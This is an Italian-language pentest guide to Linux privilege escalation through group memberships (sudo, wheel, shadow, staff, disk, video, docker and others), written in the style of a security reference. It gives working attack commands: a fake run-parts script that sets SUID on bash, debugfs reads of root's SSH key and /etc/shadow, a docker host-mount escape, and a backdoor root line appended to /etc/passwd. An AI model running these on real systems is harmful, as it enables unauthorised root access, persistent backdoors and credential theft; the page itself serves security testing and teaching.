# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Gruppi Sudo/Admin

### **PE - Method 1**

**A volte**, la policy **/etc/sudoers** di un sistema (o un file incluso al suo interno) contiene voci come:<sup>[[3]](#references)</sup>

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Questo significa che qualsiasi utente corrispondente a una delle due voci può eseguire qualsiasi comando come qualsiasi utente di destinazione tramite sudo (in base al resto della policy).<sup>[[3]](#references)</sup>

Se è così, per **diventare root basta eseguire**:

```
sudo su
```

Se `sudo -l` consente un'invocazione limitata di `adduser` con il solo nome utente, verifica se crea un gruppo primario omonimo che non esiste ancora. Un nuovo account in quel gruppo potrebbe ottenere privilegi se la policy sudoers effettiva li concede già a `%group`; verifica sia il comportamento di creazione del gruppo sia la regola per il gruppo prima di considerarlo un percorso di escalation. La creazione di un account modifica il sistema, quindi esamina prima la policy.

### PE - Method 2

Trova tutti i binari suid e verifica se è presente il binario **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Se **pkexec è un binario SUID**, può eseguire un programma come un altro utente solo quando polkit autorizza l'azione richiesta; il bit SUID da solo non garantisce l'accesso a root. Controlla i criteri installati e l'autorizzazione della sessione di destinazione, invece di presumere che appartenere a **sudo** o **admin** sia sufficiente.<sup>[[4]](#references)[[5]](#references)</sup>

Per il percorso separato [CVE-2021-4034](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt), verifica innanzitutto che `pkexec` sia un file eseguibile **SUID di proprietà di root**. Un binario installato senza quel bit non è l'escalation locale tramite SUID descritta nell'advisory. La stringa della versione upstream è solo un indizio: le distribuzioni possono [applicare la correzione a versioni precedenti del pacchetto](https://ubuntu.com/security/CVE-2021-4034), quindi controlla il pacchetto del vendor installato e le mitigazioni prima di considerarlo vulnerabile.

[CVE-2021-3560](https://securitylab.github.com/advisories/GHSL-2021-074-polkit/) riguarda un percorso polkit diverso: una race condition di autorizzazione D-Bus, non una vulnerabilità SUID di `pkexec`. Esamina il pacchetto polkit del vendor installato e verifica se un'azione D-Bus privilegiata raggiungibile può apportare una modifica utile; un percorso di creazione di account richiede anche un servizio adatto, come AccountsService, e l'accesso sudo del nuovo gruppo dipende dai criteri sudo effettivi. Una versione polkit segnalata o un servizio installato sono solo elementi da approfondire, specialmente nei casi in cui i vendor [applicano le correzioni a versioni precedenti](https://access.redhat.com/security/cve/cve-2021-3560). L'enumerazione passiva non dovrebbe innescare la race condition.

Nelle distribuzioni che usano ancora il vecchio backend Local Authority, esamina le regole dei gruppi con:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

I nomi dei gruppi pertinenti e i valori predefiniti variano a seconda della distribuzione; un gruppo è utile in questo caso solo se la policy locale lo prevede.<sup>[[5]](#references)</sup>

Per **diventare root puoi eseguire**:

```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```

Se provi a eseguire **pkexec** e ottieni questo **errore**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

In una sessione SSH senza un agent di autenticazione registrato, `pkexec` può non riuscire con questo errore anche se la policy consentirebbe altrimenti l’azione; polkit documenta `pkttyagent` come agent di autenticazione testuale per le sessioni non desktop. Il comportamento esatto dipende dalla versione e dalla distribuzione, quindi verifica la policy locale e la configurazione dell’agent. Una soluzione alternativa segnalata per alcune versioni interessate di NixOS usa **2 sessioni SSH diverse**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

Una ACL che nega a un account l’accesso a `su` si applica a quell’eseguibile, non a ogni possibile percorso per eseguire un’azione autorizzata dall’amministratore. Se le credenziali di un amministratore sono state esposte indipendentemente, verifica se la policy polkit effettiva consente un’azione separata, come avviare un servizio transitorio tramite `systemd-run`, quale identità accetta l’agent di autenticazione e quale identità userebbe il servizio risultante. [Polkit distingue l’autenticazione come proprietario della sessione da quella come amministratore](https://polkit.pages.freedesktop.org/polkit/polkit.8.html), mentre [systemd-run può richiedere un servizio transitorio al system manager](https://systemd.io/CONTROL_GROUP_INTERFACE/). Una voce nella cronologia, un comando installato o un file di policy leggibile, da soli, non dimostrano l’autorizzazione né la validità delle credenziali; una verifica passiva non dovrebbe inviare credenziali né avviare un’unità.

```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```

## Gruppo Wheel

A volte una policy sudoers può contenere anche questa voce:

```
%wheel	ALL=(ALL:ALL) ALL
```

Questo significa che qualsiasi utente corrispondente alla voce può eseguire qualsiasi comando come qualsiasi utente di destinazione tramite `sudo` (in base al resto della policy).<sup>[[3]](#references)</sup>

In questo caso, per **diventare root basta eseguire**:

```
sudo su
```

## Gruppo shadow

Nei sistemi in cui i permessi lo consentono, gli utenti del gruppo **shadow** possono **leggere** **/etc/shadow**; verifica i permessi effettivi e le ACL sul target:<sup>[[6]](#references)[[7]](#references)</sup>

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

Quindi, leggi il file e prova a **craccare alcuni hash**.

Una precisazione utile sullo stato di blocco quando analizzi gli hash:
- Le voci con `!` o `*` generalmente non consentono l'accesso interattivo tramite password.
- `!hash` significa che la password è stata bloccata; i caratteri rimanenti rappresentano il campo password prima del blocco.
- Un campo contenente `*` non è un hash `crypt(3)` valido e impedisce l'accesso UNIX tramite password; non dedurre da questo se una password fosse stata impostata in precedenza.
Questo è utile per classificare gli account anche quando l'accesso diretto è bloccato.<sup>[[6]](#references)</sup>

## Gruppo staff

**staff**: consente agli utenti di aggiungere modifiche locali al sistema (`/usr/local`) senza privilegi di root (nota che gli eseguibili in `/usr/local/bin` sono inclusi nella variabile PATH di qualsiasi utente e possono «sovrascrivere» gli eseguibili con lo stesso nome in `/bin` e `/usr/bin`). Confrontalo con il gruppo «adm», più legato al monitoraggio e alla sicurezza.<sup>[[2]](#references)[[7]](#references)</sup>

Nelle configurazioni Debian in cui `/usr/local/bin` precede `/usr/bin` in `PATH` (come negli esempi seguenti), un comando senza percorso viene risolto prima nella copia in `/usr/local/bin`; verifica il `PATH` effettivo sul target.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Se un processo privilegiato risolve un comando senza percorso tramite una directory `/usr/local/bin` scrivibile, sostituire quel comando può consentire di eseguirlo con i privilegi del processo; prima di testare, verifica il percorso effettivo e il trigger.

Sui sistemi Ubuntu, `pam_motd` esegue script eseguibili tramite `run-parts --lsbsysinit` come root al login; anche i cron job possono usare `run-parts`, ma ciò dipende dalla distribuzione e dalla configurazione.<sup>[[10]](#references)[[11]](#references)</sup>

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

A un nuovo accesso SSH, `pspy` può aiutare a confermare se questo percorso viene effettivamente eseguito sul target; può osservare le righe di comando dei processi senza privilegi di root.<sup>[[10]](#references)[[12]](#references)</sup>

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Exploit**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Gruppo disk

L'appartenenza al gruppo **disk** può concedere accesso raw ai dispositivi a blocchi ed è spesso **quasi equivalente all'accesso root**; Debian la descrive come per lo più equivalente a root, ma verifica le autorizzazioni effettive dei dispositivi e la configurazione dello storage sul target.<sup>[[7]](#references)</sup>

I percorsi comuni dei dispositivi includono `/dev/sd*`, ma NVMe e altre configurazioni dello storage usano nomi diversi.

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

`debugfs` opera su filesystem ext2/ext3/ext4; percorsi come `/root` e `/etc/shadow` indicati sopra sono file all'interno del filesystem aperto, mentre il secondo argomento di `dump` è un percorso di output sul filesystem nativo.<sup>[[8]](#references)</sup> Ad esempio, estrae `/tmp/asd1.txt` dal filesystem aperto e lo salva in `/tmp/asd2.txt` sul filesystem nativo:

```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

L'opzione `-w` apre il filesystem in lettura e scrittura, mentre il comando `write` copia un file nativo nel filesystem aperto. Evita di usarlo su un filesystem live montato, perché le modifiche dirette possono corromperlo; quando possibile, lavora da un'immagine offline.<sup>[[8]](#references)</sup>

```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```

## Gruppo video

Usando il comando `w` puoi scoprire **chi ha effettuato l'accesso al sistema** e verrà mostrato un output simile al seguente.<sup>[[20]](#references)</sup>

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

La voce **tty1** identifica la prima console virtuale Linux; da sola non dimostra che un utente sia fisicamente presente sulla macchina, soprattutto nei container o in altri ambienti.<sup>[[21]](#references)</sup>

Nei sistemi che espongono un dispositivo framebuffer leggibile, l’appartenenza al gruppo **video** può concedere l’accesso a tale dispositivo. L’interfaccia framebuffer di Linux documenta `/dev/fb0` come dispositivo di memoria leggibile che può essere copiato per acquisire un’istantanea dello schermo; il percorso `/sys/class/graphics/fb0/virtual_size` è disponibile solo quando è presente tale attributo sysfs di fbdev, quindi verifica prima il sistema di destinazione.<sup>[[7]](#references)[[9]](#references)</sup>

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Se la versione installata di **GIMP** espone un importer di dati raw, apri **`screen.raw`** con quell’importer; il supporto e i controlli variano a seconda della versione e del plug-in.<sup>[[22]](#references)</sup>

![Gruppo Disk - Gruppo Video: per aprire l'immagine raw puoi usare GIMP, selezionare il file screen.raw e scegliere Raw image data come tipo di file](<../../../images/image (463).png>)

Imposta la larghezza e l'altezza dell'immagine in modo che corrispondano alla geometria del framebuffer; prova i formati pixel/Tipi di immagine disponibili finché l'output non risulta leggibile.<sup>[[9]](#references)</sup>

![Gruppo Disk - Gruppo Video: modifica poi la larghezza e l'altezza impostandole su quelle usate sullo schermo e prova diversi tipi di immagine (seleziona quello che mostra meglio lo schermo)](<../../../images/image (317).png>)

## Gruppo root

L'appartenenza al gruppo **root** non fornisce l'UID di root, ma i file scrivibili dal gruppo e di proprietà di `root` possono comunque essere interessanti quando servizi o librerie privilegiati li utilizzano. Verifica i permessi effettivi del file e il modo in cui viene usato prima di considerarlo un percorso di privilege escalation.

**Controlla quali file possono essere modificati dai membri del gruppo root**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Gruppo Docker

L'appartenenza al gruppo `docker` concede accesso a livello root al daemon Docker nelle installazioni standard rootful. Poiché i bind mount sono in lettura-scrittura per impostazione predefinita, un utente che può controllare quel daemon può montare la `/` dell'host in un container e modificare i file dell'host; questo equivale di fatto a ottenere root sull'host.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

L'appartenenza al gruppo potrebbe non essere sincronizzata tra `/etc/group`, `/etc/gshadow` e il token del processo corrente. Se un utente non compare in `id -nG` ma `newgrp docker` ha esito positivo, controlla il gruppo mostrato da `id` nella nuova shell e verifica se il socket Docker è effettivamente scrivibile e se serve un daemon rootful. Il solo nome del gruppo non dimostra il controllo dell'host. Limita qualsiasi probe automatica con `newgrp`, in modo che una richiesta di password non blocchi l'enumerazione.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```

Infine, se non ti piace nessuno dei suggerimenti precedenti o per qualche motivo non funzionano (firewall dell'API Docker?), puoi sempre provare a **eseguire un container privilegiato e a evadere da esso**, come spiegato qui:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Se hai permessi di scrittura sul socket Docker, leggi [**questo post su come escalare i privilegi abusando del socket Docker**](../../linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## Gruppo lxc/lxd

{{#ref}}
lxd-privilege-escalation.md
{{#endref}}

## Gruppo Adm

Di solito i **membri** del gruppo **`adm`** hanno i permessi per **leggere i file di log** che si trovano in _/var/log/_.\
Pertanto, se hai compromesso un utente appartenente a questo gruppo, dovresti assolutamente **dare un'occhiata ai log**.<sup>[[7]](#references)</sup>

## Gruppi Backup / Operator / lp / Mail

Questi gruppi hanno significati specifici in base al servizio e alla distribuzione. Debian documenta `backup` per le operazioni di backup/ripristino delegate, `lp` per i demoni di stampa e `mail` per `/var/mail`; controlla quindi i permessi locali prima di considerare l'appartenenza a questi gruppi una via per ottenere privilegi.<sup>[[7]](#references)</sup>

Spesso sono vettori per la **scoperta di credenziali**, piuttosto che vie dirette per ottenere root:
- **backup**: può esporre archivi contenenti configurazioni, chiavi, dump di DB o token.
- **operator**: accesso operativo specifico della piattaforma, che può causare la fuoriuscita di dati sensibili in fase di esecuzione.
- **lp**: le code e gli spool di stampa possono contenere il contenuto dei documenti.
- **mail**: gli spool di posta possono esporre link di reimpostazione, OTP e credenziali interne.

Considera l'appartenenza a questi gruppi come un'evidenza di esposizione di dati di alto valore e cerca di sfruttare il riutilizzo di password/token.

## Gruppo Auth

Su OpenBSD, quando S/Key è configurato, `/etc/skey` appartiene a `root:auth` e per accedere ai relativi record è necessario appartenere al gruppo `auth`; i record YubiKey sono archiviati in `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Una configurazione vulnerabile di OpenBSD 6.6 con S/Key o YubiKey abilitato consentiva agli utenti locali con privilegi `auth` di diventare root; Qualys documenta i prerequisiti e la catena di exploit, mentre il PoC collegato la implementa.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Autenticazione di pkexec/pkttyagent senza una sessione GUI (segnalazione NixOS #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [Gruppi di sistema - Wiki Debian](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — pagine man Debian](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — Manuale di riferimento di polkit](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — pagina man di Linux](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Manuale per la messa in sicurezza di Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — pagina man di Linux](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Il dispositivo framebuffer — documentazione del kernel Linux](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — pagine man di Ubuntu](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — pagine man Debian](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — monitoraggio dei processi Linux senza privilegi](https://github.com/DominicBreuker/pspy)
- [13] [Sicurezza di Docker Engine](https://docs.docker.com/engine/security/)
- [14] [Gestire Docker come utente non root](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Esecuzione dei container — documentazione Docker](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — pagine man di OpenBSD](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — pagine man di OpenBSD](https://man.openbsd.org/login_yubikey.8)
- [18] [Vulnerabilità di autenticazione in OpenBSD — avviso di sicurezza Qualys](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — PoC di exploit locale](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — pagina man di Linux](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Dispositivi allocati di Linux (versione 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Importazione ed esportazione di immagini — documentazione di GIMP](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
